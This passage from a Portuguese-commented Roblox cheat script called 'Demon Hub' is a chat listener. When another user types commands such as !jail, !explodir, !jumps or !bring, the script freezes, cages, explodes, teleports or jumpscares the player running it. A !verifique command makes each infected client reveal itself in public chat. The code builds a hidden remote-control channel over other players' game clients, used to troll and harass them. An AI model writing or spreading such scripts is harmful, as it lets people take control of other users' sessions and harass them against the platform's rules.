            -- Float (PREFIXO !)
            local floatTarget = msgText:match("!float%s+(%w+)")
            if floatTarget and floatTarget == playerName then
                FloatPlayer(LocalPlayer)
                return
            end

            -- Explodir (PREFIXO !)
            local explodirTarget = msgText:match("!explodir%s+(%w+)")
            if explodirTarget and explodirTarget == playerName then
                ExplodirPlayer(LocalPlayer)
                return
            end

            -- Ghostface (PREFIXO !)
            local ghostfaceTarget = msgText:match("!ghostface%s+(%w+)")
            if ghostfaceTarget and ghostfaceTarget == playerName then
                ActivateGhostfaceMode()
                return
            end

            -- UnGhostface (PREFIXO !)
            local unghostfaceTarget = msgText:match("!unghostface%s+(%w+)")
            if unghostfaceTarget and unghostfaceTarget == playerName then
                DeactivateGhostfaceMode()
                return
            end

            -- Backrooms (PREFIXO !)
            local backroomsTarget = msgText:match("!backrooms%s+(%w+)")
            if backroomsTarget and backroomsTarget == playerName then
                print("[Demon Hub] Executando Backrooms...")
                TeleportToBackrooms(LocalPlayer)
                return
            end

            -- Unbackrooms (PREFIXO !)
            local unbackroomsTarget = msgText:match("!unbackrooms%s+(%w+)")
            if unbackroomsTarget and unbackroomsTarget == playerName then
                RestoreNormalWorld()
                return
            end

            -- Cubo de Castigo (PREFIXO !)
            local cuboTarget = msgText:match("!cubo%s+(%w+)")
            if cuboTarget and cuboTarget == playerName then
                TeleportToCube(LocalPlayer)
                return
            end

            -- Remover do Cubo (PREFIXO !)
            local uncuboTarget = msgText:match("!uncubo%s+(%w+)")
            if uncuboTarget and uncuboTarget == playerName then
                RemoveFromCube(LocalPlayer)
                return
            end

            -- Coolkid Avatar (PREFIXO !)
            local coolkidTarget = msgText:match("!coolkidavatar%s+(%w+)")
            if coolkidTarget and coolkidTarget == playerName then
                ApplyCoolkidAvatar()
                return
            end

            -- Jumpscares (PREFIXO !)
            for i = 1, 4 do
                local jumpscareTarget = msgText:match("!jumps" .. i .. "%s+(%w+)")
                if jumpscareTarget and jumpscareTarget == playerName then
                    ExecutarJumpscare(i)
                    return
                end
            end

            -- Verifique (PREFIXO !)
            if msgText:match("!verifique") then
                pcall(function()
                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                    if channel then
                        channel:SendAsync("Demon###")
                    end
                end)
            end

            -- Bring (PREFIXO !)
            local bringTarget = msgText:match("!bring%s+(%w+)")
            if bringTarget then
                if bringTarget == LocalPlayer.Name:lower() then
                    local autorPlayer = Players:FindFirstChild(autor)
                    if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        local root = character and character:FindFirstChild("HumanoidRootPart")
                        if root then
                            root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
                        end
                    end
                end
            end

            -- Jail (PREFIXO !) - COM MESMA TEXTURA DO CUBO
            local jailTarget = msgText:match("!jail%s+(%w+)")
            if jailTarget and jailTarget == playerName then
                if character then
                    local root = character:FindFirstChild("HumanoidRootPart")
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if root and humanoid then
                        playerOriginalSpeed[playerName] = humanoid.WalkSpeed
                        humanoid.WalkSpeed = 0

                        local pos = root.Position
                        
                        -- Criar jail com a mesma textura do cubo
                        CriarJailComTextura(pos, playerName)
                        
                        -- Conexão para manter o jogador dentro da jaula
                        if jailConnections[playerName] then
                            jailConnections[playerName]:Disconnect()
                        end
                        jailConnections[playerName] = RunService.Heartbeat:Connect(function()
                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                local hrp = LocalPlayer.Character.HumanoidRootPart
                                local center = pos + Vector3.new(0, 2, 0)
                                if (hrp.Position - center).Magnitude > 4 then
                                    hrp.CFrame = CFrame.new(center)
                                end
                            end
                        end)
                    end
                end
            end

            -- Unjail (PREFIXO !) - REMOVE JAIL
            local unjailTarget = msgText:match("!unjail%s+(%w+)")
            if unjailTarget and unjailTarget == playerName then
                if character then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16
                        playerOriginalSpeed[playerName] = nil
                    end

                    -- Remover a jaula
                    RemoverJail(playerName)
                end
            end
        end

        -- Conectar chat para sempre receber comandos
        local function ConectarChat()
            for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
                if channel:IsA("TextChannel") then
                    channel.MessageReceived:Connect(function(message)
                        if message.TextSource and message.Text then
                            ExecutarComando(message.Text:lower(), message.TextSource.Name)
                        end
                    end)
                end
            end
        end

        ConectarChat()
        TextChatService.TextChannels.ChildAdded:Connect(function(channel)
            if channel:IsA("TextChannel") then
                channel.MessageReceived:Connect(function(message)
                    if message.TextSource and message.Text then
                        ExecutarComando(message.Text:lower(), message.TextSource.Name)
                    end
                end)
            end
        end)

        LocalPlayer.CharacterAdded:Connect(function()
            task.wait(0.5)
            ConectarChat()
        end)

    end)
    
    if not success then
        warn("[Demon Hub] Erro ao criar interface:", errorMsg)
        print(debug.traceback())
    else
        print("[Demon Hub] Interface carregada com sucesso!")
    end
else
    print("[Demon Hub] Usuário não é dono, pulando interface...")
end

-- Som de conclusão
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 0.5
sound.PlayOnRemove = true
sound.Parent = workspace
sound:Destroy()

print("[Demon Hub] Script carregado com sucesso!")
print("[Demon Hub] Usuário:", LocalPlayer.Name)
print("[Demon Hub] Display Name:", LocalPlayer.DisplayName)
print("[Demon Hub] É dono?", isOwner)
print("[Demon Hub] Whitelist Status:", whitelistStatus)
